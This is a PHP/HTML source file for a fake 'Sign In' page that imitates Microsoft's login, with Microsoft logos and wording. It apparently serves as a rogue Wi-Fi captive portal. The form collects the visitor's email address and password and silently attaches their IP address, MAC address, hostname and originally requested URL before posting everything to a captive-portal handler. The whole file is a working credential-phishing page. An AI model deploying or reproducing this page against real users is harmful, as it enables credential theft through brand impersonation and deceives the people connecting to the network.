<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head style="background-color: #fff; color: #222">
        <center>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width">

        <script type="text/javascript">
            function redirect() {
                setTimeout(function() {
                    window.location = "captiveportal/index.php";
                }, 100);
            }
        </script>
        <title>Sign In</title>
        <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
        <link rel="stylesheet" type="text/css" href="styling.css">
    </center>
    </head>

    <body style="background-color: #fff; color: #222">
        <center>
        <div class="container">
            <header id="header-img">
                <img src="images/AppCentipede_Microsoft.svg">
            </header>
            
            <section>
                <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
                    
                    <h1>Sign In</h1>
                    <p>Use your Microsoft account. <br> <a href="#">What's this?</a></p>
                    <input type="text" name="email" placeholder="Email address" _autofocus="true" autocorrect="off" autocomplete="true" autocapitalize="off" required>

                    <input type="password" name="password" placeholder="Password" autocorrect="off" autocomplete="true" autocapitalize="off" required>
                </center>
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>>
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                <input type="hidden" name="target" value="<?=$destination?>">
                <div id="form-submit">
                    <center>
                    <button type="submit">Next</button>
                </center>
                </div>
                <center>
                </form>
                <p>No account? <a href="#">Create one!</a></p>
            </center>

            </section>
            
            <footer>
                <center>
                <p><a href="#">Terms of Use</a></p>
                    <p><a href="#">Privacy & Cookies</a></p>
                <div id="footer-img">
                    <img src="images/Microsoft_Logotype_Gray.svg">
                </div>
            </center>
            </footer>
        
        </div>
    </center>
    </body>
</html>
